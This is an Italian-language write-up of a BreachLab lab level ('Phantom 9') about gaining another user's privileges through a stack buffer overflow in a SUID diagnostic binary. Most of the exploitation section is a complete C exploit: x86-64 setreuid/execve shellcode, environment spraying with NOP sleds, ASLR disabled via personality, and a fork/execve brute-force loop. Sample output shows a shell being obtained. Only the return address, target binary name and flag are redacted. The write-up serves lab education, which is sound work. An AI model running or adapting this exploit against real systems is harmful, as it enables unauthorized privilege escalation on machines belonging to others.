# Phantom Track - Phantom 9

[← Torna all'indice](../../README.md)

## Sommario

- Track: Phantom Track
- Livello: Phantom 9 ("Stack Day")
- Fonte appunti: `phantom_track/phantom9/notes.md`

## Obiettivo

Un binario SUID di diagnostica accetta un singolo argomento e lo copia, senza controlli di lunghezza, in un buffer a dimensione fissa. Il binario non è di proprietà di root ma di un altro utente non privilegiato che detiene la flag: sfruttare la vulnerabilità di memory corruption basta a ottenere una shell come quell'utente, senza bisogno di root.

## Nota di pubblicazione

Questa versione è pensata per GitHub e segue la dottrina BreachLab: spiega per intero la tecnica di stack overflow e brute force, ma omette l'indirizzo di memoria specifico usato nell'exploit (dipendente dall'ambiente) e la flag finale.

## Ricognizione

Enumerazione dei binari SUID presenti sul sistema:

```bash
find / -perm -4000 -exec ls -al {} \; 2>/dev/null
```

Tra i risultati standard (`mount`, `passwd`, `su`, ecc.) spicca un binario di proprietà dell'utente target (non root), eseguibile solo dal gruppo del box — il target esatto indicato dal brief: un tool di "diagnostica kernel" con un buffer overflow da sfruttare per ottenere l'EUID del proprietario.

## Tecnica

L'exploit combina tre elementi classici delle vulnerabilità di stack-overflow in binari a 64-bit senza protezioni complete:

1. **Disabilitazione di ASLR nel processo exploit** tramite `personality(ADDR_NO_RANDOMIZE)` — rende deterministico l'indirizzo di stack *del processo chiamante*, ma non garantisce lo stesso per il processo figlio vulnerabile, da cui la necessità di un brute force ripetuto.
2. **Environment spraying**: più variabili d'ambiente vengono riempite ciascuna con un ampio NOP sled seguito dallo stesso shellcode x86-64 (syscall `execve("/bin//sh")`), per massimizzare la probabilità che un salto "alla cieca" nello stack atterri in una delle sled e scivoli fino allo shellcode.
3. **Overflow mirato del buffer con un indirizzo di ritorno fisso**: il payload passato come argomento è un NOP sled + padding di riallineamento + un indirizzo di stack ipotizzato (dipendente dall'ambiente, non riportato qui) scritto nei byte finali del buffer, che punta — per tentativi ripetuti, dato l'ambiente containerizzato con layout di memoria relativamente stabile — da qualche parte dentro una delle variabili d'ambiente spruzzate.

Poiché l'indirizzo esatto non è garantito al primo colpo, l'exploit esegue il binario vulnerabile in loop (`fork`+`execve` ripetuti), contando i crash, finché uno dei tentativi non centra per caso l'indirizzo giusto e ottiene l'esecuzione dello shellcode con l'EUID del proprietario del binario.

## Sfruttamento

1. Preparazione del sorgente dell'exploit:

```bash
cat > /tmp/exploit.c << 'EOF'
```

2. Struttura dell'exploit (environment spraying + brute force su indirizzo di stack, con ASLR disabilitata sul processo lanciante) — l'indirizzo target va determinato/ipotizzato per il proprio ambiente e non è incluso qui:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/personality.h>
#ifndef ADDR_NO_RANDOMIZE
#define ADDR_NO_RANDOMIZE 0x0040000
#endif
int main(){
    char sc[]=
        "\x48\x31\xc0\xb0\x6b\x0f\x05"
        "\x48\x89\xc7\x48\x89\xc6\x48\x31\xc0\xb0\x71\x0f\x05"
        "\x48\x31\xc0\xb0\x21\x48\x31\xff\x48\x31\xf6\x48\xff\xc6\x0f\x05"
        "\x48\x31\xc0\xb0\x21\x48\xff\xc6\x0f\x05"
        "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57"
        "\x48\x89\xe7\x48\x31\xd2\x48\x31\xc0\xb0\x3b\x0f\x05";
    int slen=120000;
    char *nm[]={"A","B","C","D","E","F","G","H","I","J"};
    int j;
    for(j=0;j<10;j++){
        char *sv=malloc(slen+sizeof(sc));
        memset(sv,0x90,slen);
        memcpy(sv+slen,sc,sizeof(sc)-1);
        sv[slen+sizeof(sc)-1]=0;
        setenv(nm[j],sv,1);
    }
    personality(personality(0xffffffff)|ADDR_NO_RANDOMIZE);
    unsigned long target = /* <REDACTED_ADDRESS: dipende dall'ambiente> */ 0x0UL;
    char pl[79];
    memset(pl,0x90,64);
    memset(pl+64,'B',8);
    memcpy(pl+72,&target,6);
    pl[78]=0;
    char *args[]={"/usr/local/bin/<REDACTED_TARGET_BINARY>",pl,NULL};
    extern char **environ;
    pid_t tp=fork();
    if(tp==0){execve(args[0],(char*[]){"k","test",NULL},environ);write(2,"EXECVE FAIL\n",12);_exit(99);}
    int ts;waitpid(tp,&ts,0);
    if(WIFEXITED(ts)&&WEXITSTATUS(ts)==99){fprintf(stderr,"[!] execve fallito\n");return 1;}
    fprintf(stderr,"[*] OK! Brute-forcing (NON TOCCARE NULLA)\n\n");
    int i,c=0;
    for(i=1;;i++){
        pid_t pid=fork();
        if(pid<0){usleep(1000);continue;}
        if(pid==0){close(1);close(2);execve(args[0],args,environ);_exit(1);}
        int st;waitpid(pid,&st,0);
        if(WIFSIGNALED(st))c++;
        if(i%1000==0)fprintf(stderr,"[*] %d (%d crash)\n",i,c);
    }
}
```

3. Compilazione ed esecuzione — il loop macina migliaia di tentativi (ognuno termina in crash, tranne quello fortunato) fino a ottenere una shell:

```bash
gcc -o /tmp/exploit /tmp/exploit.c && /tmp/exploit
[*] Kernel diagnostic tool v1.0
[*] Checking kernel module: test
[-] Module not found.
[*] OK! Brute-forcing (NON TOCCARE NULLA)

[*] 1000 (1000 crash)
...
[*] 22000 (22000 crash)
$ id
uid=<REDACTED>(<REDACTED_user>) gid=<REDACTED> groups=<REDACTED>
$ whoami
<REDACTED_user>
```

4. Con la shell ottenuta come utente target, individuazione della flag nella directory delle flag del sistema (percorso e valore non riportati in questa versione pubblica).

## Risultato

Ottenuta esecuzione di codice arbitrario con l'EUID del proprietario del binario SUID vulnerabile, tramite stack buffer overflow sfruttato con environment spraying + brute force su indirizzo di ritorno. Valore della flag omesso in questa versione pubblica.

---

## Crediti

Lab: BreachLab. Pubblicare sempre con credito al progetto e senza spoiler risolutivi.
